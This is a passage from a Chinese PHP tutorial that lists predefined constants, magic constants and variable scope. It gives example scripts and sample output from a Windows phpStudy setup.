<td align="center">PHP_FLOAT_EPSILON</td>
<td align="center">浮点型，最小的可表示正数 x，使 x + 1.0 != 1.0</td>
<td align="center">7.2.0</td>
</tr>
<tr>
<td align="center">19</td>
<td align="center">PHP_FLOAT_MAX</td>
<td align="center">最大浮点数</td>
<td align="center">7.2.0</td>
</tr>
<tr>
<td align="center">20</td>
<td align="center">PHP_FLOAT_MIN</td>
<td align="center">最小浮点数</td>
<td align="center">7.2.0</td>
</tr>
<tr>
<td align="center">21</td>
<td align="center">DEFAULT_INCLUDE_PATH</td>
<td align="center">默认的包含文件路径</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">22</td>
<td align="center">PEAR_INSTALL_DIR</td>
<td align="center">pear安装目录</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">23</td>
<td align="center">PEAR_EXTENSION_DIR</td>
<td align="center">pear扩展目录</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">24</td>
<td align="center">PHP_EXTENSION_DIR</td>
<td align="center">php扩展目录</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">25</td>
<td align="center">PHP_PREFIX</td>
<td align="center">安装php执行configure时，<code>-prefix</code>选项设置的值</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">26</td>
<td align="center">PHP_BINDIR</td>
<td align="center">二进制文件安装的目录</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">27</td>
<td align="center">PHP_BINARY</td>
<td align="center">脚本执行期间二进制文件的路径</td>
<td align="center">5.4.0</td>
</tr>
<tr>
<td align="center">28</td>
<td align="center">PHP_MANDIR</td>
<td align="center">PHP手册页的安装位置</td>
<td align="center">5.3.7</td>
</tr>
<tr>
<td align="center">29</td>
<td align="center">PHP_LIBDIR</td>
<td align="center">PHP库文件目录</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">30</td>
<td align="center">PHP_DATADIR</td>
<td align="center">PHP通用数据文件目录</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">31</td>
<td align="center">PHP_SYSCONFDIR</td>
<td align="center">PHP在单个机器上使用的只读数据的安装目录</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">32</td>
<td align="center">PHP_LOCALSTATEDIR</td>
<td align="center">PHP单机使用的可写数据的安装目录</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">33</td>
<td align="center">PHP_CONFIG_FILE_PATH</td>
<td align="center">php.ini的搜索路径</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">34</td>
<td align="center">PHP_CONFIG_FILE_SCAN_DIR</td>
<td align="center">扫描扩展的ini配置文件的目录</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">35</td>
<td align="center">PHP_SHLIB_SUFFIX</td>
<td align="center">当前php构建平台共享库的后缀，如so（Unix）、ddl（windows）</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">36</td>
<td align="center">PHP_FD_SETSIZE</td>
<td align="center">select系统调用的文件描述符的最大数量</td>
<td align="center">7.1.0</td>
</tr>
<tr>
<td align="center">37</td>
<td align="center">E_ERROR</td>
<td align="center">致命的运行时错误。这类错误一般是不可恢复的情况，导致脚本终止不再继续运行</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">38</td>
<td align="center">E_WARNING</td>
<td align="center">运行时警告 (非致命错误)。仅给出提示信息，但是脚本不会终止运行</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">39</td>
<td align="center">E_PARSE</td>
<td align="center">编译时语法解析错误，解析错误仅仅由分析器产生</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">40</td>
<td align="center">E_NOTICE</td>
<td align="center">运行时通知。表示脚本遇到可能会表现为错误的情况，但是在可以正常运行的脚本里面也可能会有类似的通知</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">41</td>
<td align="center">E_CORE_ERROR</td>
<td align="center">在PHP初始化启动过程中发生的致命错误，该错误类似 E_ERROR，但是是由PHP引擎核心产生的</td>
<td align="center">4.0.0</td>
</tr>
<tr>
<td align="center">42</td>
<td align="center">E_CORE_WARNING</td>
<td align="center">PHP初始化启动过程中发生的警告 (非致命错误)，类似 E_WARNING，但是是由PHP引擎核心产生的</td>
<td align="center">4.0.0</td>
</tr>
<tr>
<td align="center">43</td>
<td align="center">E_COMPILE_ERROR</td>
<td align="center">致命编译时错误, 类似E_ERROR但是是由Zend脚本引擎产生的</td>
<td align="center">4.0.0</td>
</tr>
<tr>
<td align="center">44</td>
<td align="center">E_COMPILE_WARNING</td>
<td align="center">编译时警告 (非致命错误)，类似 E_WARNING但是是由Zend脚本引擎产生的</td>
<td align="center">4.0.0</td>
</tr>
<tr>
<td align="center">45</td>
<td align="center">E_USER_ERROR</td>
<td align="center">用户产生的错误信息, 类似 E_ERROR但是是由用户自己在代码中使用PHP函数trigger_error()来产生的</td>
<td align="center">4.0.0</td>
</tr>
<tr>
<td align="center">46</td>
<td align="center">E_USER_WARNING</td>
<td align="center">用户产生的警告信息，类似 E_WARNING但是是由用户自己在代码中使用PHP函数trigger_error()来产生的</td>
<td align="center">4.0.0</td>
</tr>
<tr>
<td align="center">47</td>
<td align="center">E_USER_NOTICE</td>
<td align="center">用户产生的通知信息，类似 E_WARNING但是是由用户自己在代码中使用PHP函数trigger_error()来产生的</td>
<td align="center">4.0.0</td>
</tr>
<tr>
<td align="center">48</td>
<td align="center">E_RECOVERABLE_ERROR</td>
<td align="center">可被捕捉的致命错误。它表示发生了一个可能非常危险的错误，但是还没有导致PHP引擎处于不稳定的状态。如果该错误没有被用户自定义句柄捕获将成为一个 E_ERROR从而脚本会终止运行</td>
<td align="center">5.2.0</td>
</tr>
<tr>
<td align="center">49</td>
<td align="center">E_DEPRECATED</td>
<td align="center">运行时通知，启用后将会对在未来版本中可能无法正常工作的代码给出警告</td>
<td align="center">5.3.0</td>
</tr>
<tr>
<td align="center">50</td>
<td align="center">E_USER_DEPRECATED</td>
<td align="center">用户产生的警告信息。类似 E_DEPRECATED但是是由用户自己在代码中使用PHP函数trigger_error()来产生的</td>
<td align="center">5.3.0</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">E_ALL</td>
<td align="center">E_STRICT除外的所有错误和警告信息</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">52</td>
<td align="center">E_STRICT</td>
<td align="center">启用PHP对代码的修改建议，以确保代码具有最佳的互操作性和向前兼容性</td>
<td align="center">5.0.0</td>
</tr>
<tr>
<td align="center">53</td>
<td align="center"><code>__COMPILER_HALT_OFFSET__</code></td>
<td align="center">获取嵌入数据中数据开始字节的位置<br />只有在文件中存在**__halt_compiler()**时才定义该常量</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">true</td>
<td align="center">true</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">false</td>
<td align="center">false</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">56</td>
<td align="center">null</td>
<td align="center">Null</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">57</td>
<td align="center">PHP_WINDOWS_EVENT_CTRL_C</td>
<td align="center">Windows CTRL+C 事件</td>
<td align="center">7.4.0</td>
</tr>
<tr>
<td align="center">58</td>
<td align="center">PHP_WINDOWS_EVENT_CTRL_BREAK</td>
<td align="center">Windows CTRL+BREAK 事件</td>
<td align="center">7.4.0</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> PHP_VERSION.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前版本号</span></span><br><span class="line"><span class="comment"># 5.4.45-xxx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_MAJOR_VERSION.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前主版本号</span></span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_MINOR_VERSION.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前子版本号</span></span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_RELEASE_VERSION.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前发布阶段版本号</span></span><br><span class="line"><span class="comment"># 45</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_VERSION_ID.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前PHP版本的整型数</span></span><br><span class="line"><span class="comment"># 50445</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_EXTRA_VERSION.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前PHP版本的额外版本</span></span><br><span class="line"><span class="comment"># xxx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_ZTS.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前PHP版本是否是线程安全,1为真</span></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_DEBUG.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前PHP版本是否启动debug,0为假</span></span><br><span class="line"><span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_MAXPATHLEN.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前PHP支持最大文件名（路径）的长度</span></span><br><span class="line"><span class="comment"># 260</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_OS.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前的操作系统名称</span></span><br><span class="line"><span class="comment"># WINNT</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_OS_FAMILY.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前的操作系统家族</span></span><br><span class="line"><span class="comment"># windows</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_SAPI.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 运行PHP的服务器接口类型，API</span></span><br><span class="line"><span class="comment"># cli</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_EOL.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前系统的行结束符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_INT_MAX.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前PHP支持最大整数</span></span><br><span class="line"><span class="comment"># 2147483647</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_INT_MIN.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前PHP支持最小整数</span></span><br><span class="line"><span class="comment"># -2147483648</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_INT_SIZE.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前PHP整型的位数</span></span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_FLOAT_DIG.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 可以返回四舍五入为浮点数后不会造成精度损失的小数位数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_FLOAT_EPSILON.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 浮点型，最小的可表示正数 x，使 x + 1.0 != 1.0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_FLOAT_MAX.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 最大浮点数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_FLOAT_MIN.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 最小浮点数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> DEFAULT_INCLUDE_PATH.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 默认的包含文件路径</span></span><br><span class="line"><span class="comment"># .;C:\php\pear</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PEAR_INSTALL_DIR.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># pear安装目录</span></span><br><span class="line"><span class="comment"># C:\php\pear</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PEAR_EXTENSION_DIR.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># pear扩展目录</span></span><br><span class="line"><span class="comment"># C:\php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_EXTENSION_DIR.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># php扩展目录</span></span><br><span class="line"><span class="comment"># C:\php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_PREFIX.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 安装php执行configure时，`-prefix`选项设置的值</span></span><br><span class="line"><span class="comment"># C:\php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_BINDIR.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 二进制文件安装的目录</span></span><br><span class="line"><span class="comment"># C:\php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_BINARY.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 脚本执行期间二进制文件的路径</span></span><br><span class="line"><span class="comment"># C:\phpStudy\PHPTutorial\php\php-5.4.45\php.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_MANDIR.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># PHP手册页的安装位置</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_LIBDIR.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># PHP库文件目录</span></span><br><span class="line"><span class="comment"># C:\php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_DATADIR.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># PHP通用数据文件目录</span></span><br><span class="line"><span class="comment"># C:\php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_SYSCONFDIR.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># PHP在单个机器上使用的只读数据的安装目录</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_LOCALSTATEDIR.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># PHP单机使用的可写数据的安装目录</span></span><br><span class="line"><span class="comment"># C:\phpStudy\PHPTutorial\php\php-5.4.45\php.exe </span></span><br><span class="line"><span class="comment"># C:\phpStudy\PHPTutorial\WWW\test.php</span></span><br><span class="line"><span class="comment"># C:\php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_CONFIG_FILE_PATH.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># php.ini的搜索路径</span></span><br><span class="line"><span class="comment"># C:\phpStudy\PHPTutorial\php\php-5.4.45\php.exe </span></span><br><span class="line"><span class="comment"># C:\phpStudy\PHPTutorial\WWW\test.php</span></span><br><span class="line"><span class="comment"># C:\WINDOWS</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_CONFIG_FILE_SCAN_DIR.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 扫描扩展的ini配置文件的目录</span></span><br><span class="line"><span class="comment"># C:\phpStudy\PHPTutorial\php\php-5.4.45\php.exe </span></span><br><span class="line"><span class="comment"># C:\phpStudy\PHPTutorial\WWW\test.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_SHLIB_SUFFIX.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前php构建平台共享库的后缀，如so（Unix）、ddl（windows）</span></span><br><span class="line"><span class="comment"># dll</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_FD_SETSIZE.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># select系统调用的文件描述符的最大数量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> E_ERROR.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 致命的运行时错误。这类错误一般是不可恢复的情况，导致脚本终止不再继续运行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> E_WARNING.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 运行时警告 (非致命错误)。仅给出提示信息，但是脚本不会终止运行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> E_PARSE.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 编译时语法解析错误，解析错误仅仅由分析器产生</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> E_NOTICE.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 运行时通知。表示脚本遇到可能会表现为错误的情况，但是在可以正常运行的脚本里面也可能会有类似的通知</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> E_CORE_ERROR.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 在PHP初始化启动过程中发生的致命错误，该错误类似 E_ERROR，但是是由PHP引擎核心产生的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> E_CORE_WARNING.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># PHP初始化启动过程中发生的警告 (非致命错误)，类似 E_WARNING，但是是由PHP引擎核心产生的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> E_COMPILE_ERROR.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 致命编译时错误, 类似E_ERROR但是是由Zend脚本引擎产生的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> E_COMPILE_WARNING.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 编译时警告 (非致命错误)，类似 E_WARNING但是是由Zend脚本引擎产生的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> E_USER_ERROR.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 用户产生的错误信息, 类似 E_ERROR但是是由用户自己在代码中使用PHP函数trigger_error()来产生的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> E_USER_WARNING.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 用户产生的警告信息，类似 E_WARNING但是是由用户自己在代码中使用PHP函数trigger_error()来产生的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> E_USER_NOTICE.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 用户产生的通知信息，类似 E_WARNING但是是由用户自己在代码中使用PHP函数trigger_error()来产生的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> E_RECOVERABLE_ERROR.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 可被捕捉的致命错误。它表示发生了一个可能非常危险的错误，但是还没有导致PHP引擎处于不稳定的状态。如果该错误没有被用户自定义句柄捕获将成为一个 E_ERROR从而脚本会终止运行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> E_DEPRECATED.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 运行时通知，启用后将会对在未来版本中可能无法正常工作的代码给出警告</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> E_USER_DEPRECATED.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 用户产生的警告信息。类似 E_DEPRECATED但是是由用户自己在代码中使用PHP函数trigger_error()来产生的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> E_ALL.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># E_STRICT除外的所有错误和警告信息</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> E_STRICT.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 启用PHP对代码的修改建议，以确保代码具有最佳的互操作性和向前兼容性</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> __COMPILER_HALT_OFFSET__.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 获取嵌入数据中数据开始字节的位置,只有在文件中存在__halt_compiler()时才定义该常量</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="literal">TRUE</span>);</span><br><span class="line"><span class="comment"># 布尔类型，True</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="literal">FALSE</span>);</span><br><span class="line"><span class="comment"># 布尔类型，False</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment"># Null值</span></span><br><span class="line"></span><br><span class="line">PHP_WINDOWS_EVENT_CTRL_C</span><br><span class="line"><span class="comment"># Windows CTRL+C 事件</span></span><br><span class="line"></span><br><span class="line">PHP_WINDOWS_EVENT_CTRL_BREAK</span><br><span class="line"><span class="comment"># Windows CTRL+BREAK 事件</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h2><p>魔术常量属于特殊的预定义常量，它们的值随着它们在代码中的位置改变而改变。</p>
<p>魔术常量通常以两个下划线<code>__</code>开头，并以两个下划线<code>__</code>结尾</p>
<table>
<thead>
<tr>
<th align="center">魔术常量</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>__LINE__</code></td>
<td align="center">文件中的当前行号</td>
</tr>
<tr>
<td align="center"><code>__FILE__</code></td>
<td align="center">文件的完整路径和文件名</td>
</tr>
<tr>
<td align="center"><code>__DIR__</code></td>
<td align="center">文件所在的目录</td>
</tr>
<tr>
<td align="center"><code>__FUNCTION__</code></td>
<td align="center">当前函数或方法的名称。匿名函数则为 <code>&#123;closure&#125;</code></td>
</tr>
<tr>
<td align="center"><code>__CLASS__</code></td>
<td align="center">当前类的名称。类名包括其被声明的作用域</td>
</tr>
<tr>
<td align="center"><code>__TRAIT__</code></td>
<td align="center">Trait 的名字。Trait 名包括其被声明的作用域</td>
</tr>
<tr>
<td align="center"><code>__METHOD__</code></td>
<td align="center">类的方法名或者类名</td>
</tr>
<tr>
<td align="center"><code>__NAMESPACE__</code></td>
<td align="center">当前命名空间的名称</td>
</tr>
<tr>
<td align="center"><code>ClassName::class</code></td>
<td align="center">完整的类名</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">My</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;当前的行号为&quot;</span>.<span class="keyword">__LINE__</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;当前的文件为&quot;</span>.<span class="keyword">__FILE__</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;当前文件的目录为&quot;</span>.<span class="keyword">__DIR__</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lei</span></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;当前函数的名字为&quot;</span>.<span class="keyword">__FUNCTION__</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;当前类的名字为&quot;</span>.<span class="keyword">__CLASS__</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;当前类的方法名&quot;</span>.<span class="keyword">__METHOD__</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;当前的命名空间名称是&quot;</span>.<span class="keyword">__NAMESPACE__</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">lei::test();</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">A</span></span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">nameA</span>(<span class="params"></span>)</span>&#123;<span class="keyword">echo</span> <span class="string">&quot;当前Trait的名字为&quot;</span>.<span class="keyword">__TRAIT__</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">B</span></span>&#123;<span class="keyword">use</span> <span class="title">A</span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;<span class="keyword">use</span> <span class="title">B</span>;&#125;</span><br><span class="line">(<span class="keyword">new</span> test)-&gt;nameA();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 当前的行号为3</span></span><br><span class="line"><span class="comment"># 当前的文件为C:\phpStudy\PHPTutorial\WWW\test.php</span></span><br><span class="line"><span class="comment"># 当前文件的目录为C:\phpStudy\PHPTutorial\WWW</span></span><br><span class="line"><span class="comment"># 当前函数的名字为test</span></span><br><span class="line"><span class="comment"># 当前类的名字为My\lei</span></span><br><span class="line"><span class="comment"># 当前类的方法名My\lei::test</span></span><br><span class="line"><span class="comment"># 当前的命名空间名称是My</span></span><br><span class="line"><span class="comment"># 当前Trait的名字为My\A</span></span><br></pre></td></tr></table></figure>



<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量来源于数学，是计算机语言中能储存计算结果或者能表示抽象概念。</p>
<p>变量可以通过变量名访问，在指令式语言中，变量通常是可变的。</p>
<p>PHP中的变量用一个美元符号后面跟变量名来表示，变量名是区分大小写的</p>
<p>一个变量由英文字母，下划线，数字组成，但是数字不能作为首字母出现</p>
<p>按照正则表达式，它将被表述为<code>^[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff]*$</code></p>
<p><strong>定义变量</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>删除变量</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>作用域</strong></p>
<p>PHP有四种不同的变量作用域，作用域内的变量不能在另一个作用域中访问</p>
<ul>
<li>local（局部作用域）</li>
<li>global（全局作用域）</li>
<li>static（静态作用域）</li>
<li>parameter（函数参数作用域）</li>
</ul>
<p>local局部作用域，用于函数内部声明的变量，只能在函数内部访问</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$x</span> = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 此时在函数外部是无法访问变量x的</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"><span class="built_in">error</span></span><br><span class="line"><span class="comment"># 也可以在函数外部创建变量x,但是这个变量和函数内部的变量不是同一个变量</span></span><br><span class="line"><span class="variable">$x</span> = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"><span class="number">123</span></span><br><span class="line">Test()</span><br><span class="line">hello</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>global全局作用域，用于函数外部声明的变量，只能在函数外部访问，</p>
<p>函数内部访问需要关键词<code>global</code>，或者数组<code>$GLOBALS[index]</code></p>
